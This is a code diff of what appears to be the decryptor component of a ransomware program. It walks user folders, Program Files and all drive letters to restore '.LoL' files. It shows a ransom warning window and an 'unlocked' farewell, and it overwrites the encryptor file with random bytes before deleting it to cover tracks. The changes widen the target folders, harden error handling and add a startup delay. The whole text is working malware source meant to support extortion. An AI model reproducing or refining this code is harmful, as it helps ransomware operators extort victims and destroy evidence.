@@ -39,20 +39,25 @@ class Decryptor:
 
     @classmethod
     def decEach(self, path):
-        originName=path.strip(".LoL")
-        with open(path, "rb") as File:
-            data=File.read()
-        decryptedFile=DecryptModule.decrypt(data)
-        with open(originName, "wb") as File:
-            File.write(decryptedFile)
-        os.remove(path)
+        try:
+            originName=path.strip(".LoL")
+            with open(path, "rb") as File:
+                data=File.read()
+            decryptedFile=DecryptModule.decrypt(data)
+            with open(originName, "wb") as File:
+                File.write(decryptedFile)
+            os.remove(path)
+        except (PermissionError, FileNotFoundError):
+            if (os.path.isfile(originName)):
+                os.remove(originName)
 
     def decryptFile(self):
-        try:
-            for file in self._files:
-                if(os.path.isfile(file)==True):
-                    if(file==sys.argv[0]):
-                        return
+        for file in self._files:
+            if(os.path.isfile(file)==True):
+                if(file==sys.argv[0]):
+                    return
+                    
+                try:
                     extension=os.path.splitext(file)[-1]
                     if(extension!='.LoL'):
                         continue;
@@ -66,18 +71,18 @@ class Decryptor:
                             self.decEach(file)
                     else :
                         self.decEach(file)
-        except Exception as e:
-            pass
+                except Exception as e:
+                    pass
 
 def listUpTargetDir():
     global PathList
-    PathList=[r"C:\Users\\"]
+    PathList=[r"C:\Users\\", r"C:\Program Files\\", r"C:\Program Files (x86)\\"]
     for letter in range(97, 123):
         drive=f"{chr(letter)}:\\"
         if (pathlib.Path(drive).exists()):
             PathList.append(drive)
-    PathList.remove("c:\\")
-
+    PathList.remove("C:\\")
+    
 
 def recursiveDecrypt(basepath):
     try:
@@ -123,7 +128,6 @@ def decryptComputer():
         sys.exit(0)
     except Exception as e:
         pass
-        
 
 def ransomewareWarning():
     global entry
@@ -159,13 +163,16 @@ def completeDecryption():
     messagebox.showerror("User computer is unlocked!", "Thank you for using our service:):):):):) Bye!")
 
 def eraseEncryptor():
-    sleep(1)
-    with open(removeTarget, "wb") as File:
-        file_size=os.path.getsize(removeTarget)
-        File.write(os.urandom(file_size+1))
-    os.remove(removeTarget)
+    try:
+        with open(removeTarget, "wb") as File:
+            file_size=os.path.getsize(removeTarget)
+            File.write(os.urandom(file_size+1))
+        os.remove(removeTarget)
+    except Exception as e:
+        pass
 
 if __name__=='__main__':
+    sleep(500)
     eraseEncryptor()
     listUpTargetDir()
     ransomewareWarning()
